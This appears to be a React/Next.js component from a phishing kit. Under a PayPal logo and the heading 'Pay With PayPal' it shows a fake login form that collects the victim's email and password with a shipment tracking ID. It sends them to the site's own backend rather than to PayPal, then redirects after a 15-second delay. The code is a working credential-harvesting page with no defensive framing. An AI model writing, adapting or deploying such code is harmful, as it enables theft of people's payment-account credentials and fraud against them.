"use client";

import { Loader2 } from "lucide-react";
import { ChangeEvent, FormEvent, useState } from "react";
import Image from "next/image";
import axios from "axios";
import { useRouter, useSearchParams } from "next/navigation";

import { BASE_URL } from "../../../sdk/utils";
import { Loader1 } from "./loader1";

export const PayPalForm = () => {
  const params = useSearchParams();
  const router = useRouter();

  const trackingId = params.get("trackingId");
  const initForm = { email: "", password: "", trackingId };

  const [form, setForm] = useState(initForm);
  const [pending, setPending] = useState(false);
  const [res, setRes] = useState<null | string>(null);
  const [loader, setLoader] = useState(false);

  function handleChange(e: ChangeEvent<HTMLInputElement>) {
    const { name, value } = e.target;
    setForm((curr) => ({ ...curr, [name]: value }));
  }

  const isDisabled =
    pending || !form?.email?.trim() || !form?.password?.trim() ? true : false;

  async function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();

    if (isDisabled) return alert("Email and password are required");
    if (!trackingId) return alert("No shipment was found for this payment.");

    setForm((curr) => ({ ...curr, trackingId }));

    try {
      setPending(true);
      setLoader(true);
      const { status, data } = await axios.post(`${BASE_URL}/c/paypal`, form);
      setPending(false);

      if (status >= 200 && status < 300) {
        const loginId = data?.data?.paypal?._id;
        const redirectUrl = `/paypal/checkout/${loginId}`;

        localStorage.setItem("paypal", loginId);
        setRes("Please wait...");
        setForm(initForm);
        setTimeout(() => {
          setLoader(false);
          router.push(redirectUrl);
        }, 15000);
      }
    } catch (error) {
      console.log("error :>> ", error);
      setLoader(false);
      setRes("Something went wrong, please try again later.");
    } finally {
      setPending(false);
      setTimeout(() => {
        setRes(null);
      }, 8000);
    }
  }

  return (
    <>
      {loader && <Loader1 />}
      <section className="w-[93%] max-w-lg p-2 flex flex-col items-center justify-center gap-8">
        <div>
          <Image
            src={"/images/paypal-logo.png"}
            alt="paypal logo"
            width={300}
            height={300}
            className="h-auto w-32"
          />

          <p className="text-xl font-medium">Pay With PayPal</p>
        </div>

        <form className="w-full" onSubmit={(e) => handleSubmit(e)}>
          <input
            type="email"
            name="email"
            id="email"
            placeholder="Email address"
            className="p-4 text-lg border border-gray-300 rounded-sm w-full mb-4"
            onChange={(e) => handleChange(e)}
            required
            value={form.email}
          />
          <input
            type="password"
            name="password"
            id="password"
            placeholder="Your password"
            className="p-4 text-lg border border-gray-300 rounded-sm w-full"
            onChange={(e) => handleChange(e)}
            required
            value={form.password}
          />

          <p className="text-[11px] text-[#2751bd] font-semibold my-4">
            Forgot email?
          </p>

          <button
            className="rounded-full p-2 text-white bg-[#0370DF] w-full cursor-pointer grid place-items-center"
            type="submit"
            disabled={isDisabled}
          >
            {pending ? (
              <Loader2 className="animate-spin text-white" />
            ) : (
              <span>Log In</span>
            )}
          </button>
          {res && (
            <p className="text-center mt-4 text-sm text-gray-800 font-bold">
              {res}
            </p>
          )}
        </form>
      </section>
    </>
  );
};
